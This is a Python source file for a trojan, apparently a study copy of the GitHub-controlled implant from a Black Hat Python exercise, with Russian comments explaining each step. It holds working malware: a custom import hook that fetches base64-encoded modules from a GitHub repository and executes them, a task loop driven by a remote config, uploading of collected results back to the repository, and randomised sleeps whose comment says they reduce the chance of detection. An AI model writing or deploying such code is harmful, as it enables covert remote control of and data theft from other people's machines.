import base64
import github3
import importlib
import json
import random
import sys
import threading
import time

from datetime import datetime


def github_connect():
    with open('mytoken.txt') as f:
        detoken = f.read() # получаем ключ доступа к гитхабу из файла
        token = detoken.strip()
    user = 'eshkoreee'
    sess = github3.login(token=token) # получаем доступ к аккаунту по токену
    return sess.repository(user, 'bhptrojan') # возвращает объект репозитория где мы можем: читать файлы get_contents, создавать файлы create_file, обновлять файлы update_file, удалять файлы delete_file и получать список папок и файлов


def get_file_contents(dirname, module_name, repo):
    return repo.file_contents(f'{dirname}/{module_name}').content # запрашивает у гитхаб апи данные по указанному пути а .content извлекает данные из указанного файла. данные закодированы по base64


class GitImporter:
    def __init__(self):
        self.current_module_code = ""

    def find_module(self, name, path=None): # этот метод вызывает сам пайтон
        print("[*] Attempting to retrieve %s" % name) # name это название которое мы вводим после import
        self.repo = github_connect() # получаем объект нужного нам репозитория с которым мы можем делать все возможные манипуляции кроме его удаления

        new_library = get_file_contents('modules', f'{name}.py', self.repo) # указываем папку и модуль который нам нужно извлечь из репозитория self.repo и получаем модуль закодированый по base64
        if new_library is not None:
            self.current_module_code = base64.b64decode(new_library)
            return self

    def load_module(self, name):
        spec = importlib.util.spec_from_loader(name, loader=None, # этот метод вызывает сам пайтон
                                               origin=self.repo.git_url)
        new_module = importlib.util.module_from_spec(spec)
        exec(self.current_module_code, new_module.__dict__)
        sys.modules[spec.name] = new_module
        return new_module


class Trojan:
    def __init__(self, id):
        self.id = id # айди хдесь это уникальный идентификатор экземпляра трояна. конфиг трояна "abc" хранится в abc.json а собранные данные хранит в папке data/abc/
        self.config_file = f'{id}.json'
        self.data_path = f'data/{id}/'
        self.repo = github_connect() # получаем объект репозитория где можем с ним делать все что угодно

    def get_config(self):
        config_json = get_file_contents('config', self.config_file, self.repo) # ищем в репозитории bhptrojan(self.repo) папку с названием config и в ней ищем json файл self.config_file
        config = json.loads(base64.b64decode(config_json)) # декодируем и парсим json конфиг в пайтон словарь

        for task in config:
            if task['module'] not in sys.modules: # проверяем что указаный модуль еще не загружен
                exec("import %s" % task['module'])# после чего динамически импортируем наш кусок кода в троян
        return config

    def module_runner(self, module):
        result = sys.modules[module].run() # вызываем метод run у указанного модуля. сейчас у нас есть только 2 модуля это environment.py и dirlister.py
        self.store_module_result(result, module)

    def store_module_result(self, data, module):
        if data == False:
            sys.exit(0)
        message = datetime.now().isoformat() + '_' + module
        remote_path = f'data/{self.id}/{message}.data' # путь для создания файла для сохранения результата работы в момент запуска
        if isinstance(data, list):
            for item in data:
                if not isinstance(item, bytes):
                    bindata = bytes('%r' % item, 'utf-8') # тут мы передаем результат работы модуля и способ кодирования в байты
                    self.repo.create_file(remote_path, message, base64.b64encode(bindata)) # кодируем байты в base64 указываем путь сохранения файла remote_path и коммит message и сохраняем файл в репозитории
                else:
                    self.repo.create_file(remote_path, message, base64.b64encode(bindata))
        
       

    def run(self):
        while True:
            config = self.get_config() # получаем пайтон словарь полученный из json конфига
            for task in config:
                thread = threading.Thread(
                    target=self.module_runner,
                    args=(task['module'],), daemon = True)
                thread.start()
                time.sleep(random.randint(1, 10))

            time.sleep(random.randint(30*60, 3*60*60)) # проверка конфига каждые от 30 минут до 3 часов времени нужно для низкой вероятности обнаружения


if __name__ == '__main__':
    sys.meta_path.append(GitImporter()) # позволяет загружать собственные модули в троян. говорим интерпретатору сначала пройдись по моим загрузчикам модулей а только затем по дефолтным
    trojan = Trojan('abc') # инициализируем троян и получаем доступ к репозиторию с модулями и конфигами
    trojan.run() # запускаем процесс трояна
